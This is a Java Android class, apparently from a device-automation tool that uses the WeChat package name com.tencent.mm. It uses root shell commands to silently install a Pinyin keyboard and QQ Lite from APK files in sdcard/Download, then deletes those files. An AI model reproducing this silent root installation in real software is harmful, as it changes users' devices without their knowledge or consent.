package com.tencent.mm.action;

import android.app.AlarmManager;
import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;

import com.tencent.mm.Root;
import com.tencent.mm.Util;
import com.tencent.mm.http.HttpHelp;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ActionInstallDefaultApp implements ActionBase {

    private Context mContext;

    public ActionInstallDefaultApp(Context context){
        mContext = context;
    }

    @Override
    public void run(final ActionBaseListener listener, String... args) {
        final Handler handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                if(listener!=null){
                    listener.onFinish();
                }
            }
        };
        new Thread(){
            @Override
            public void run() {
                if(!Util.checkPackage(mContext,"com.google.android.inputmethod.pinyin")){
                    Root.upgradeRootPermission("pm install sdcard/Download/pingyin.apk");
                    Root.upgradeRootPermission("rm sdcard/Download/pingyin.apk");
                }
                if(!Util.checkPackage(mContext,"com.tencent.qqlite")) {
                    Root.upgradeRootPermission("pm install sdcard/Download/qqlite.apk");
                    Root.upgradeRootPermission("rm sdcard/Download/qqlite.apk");
                }
                handler.sendEmptyMessage(0);
            }
        }.start();
    }


}
